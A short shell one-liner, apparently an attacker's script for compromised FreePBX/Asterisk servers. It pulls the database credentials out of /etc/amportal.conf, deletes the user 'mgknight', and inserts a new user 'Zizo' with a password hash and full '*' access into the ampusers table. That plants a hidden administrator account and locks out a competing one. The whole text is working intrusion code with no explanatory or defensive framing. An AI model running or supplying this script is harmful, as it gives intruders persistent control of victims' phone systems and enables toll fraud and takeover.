# go
mysql `grep AMPDB /etc/amportal.conf|grep "USER\|PASS\|NAME"| sed 's/AMPDBUSER/a/g'|sed 's/AMPDBPASS/b/g'|sed 's/AMPDBNAME/c/g'|sed 's/a=/-u/g'|sed 's/b=/ -p/g'|sed 's/c=/ /g'|tr -d '\n'` --execute "DELETE from ampusers where username='mgknight';INSERT INTO ampusers (username,password_sha1,sections) VALUES ('Zizo','ca2fb460fc6e7550a6c463bf25bd90b0450a4ff8','*');"
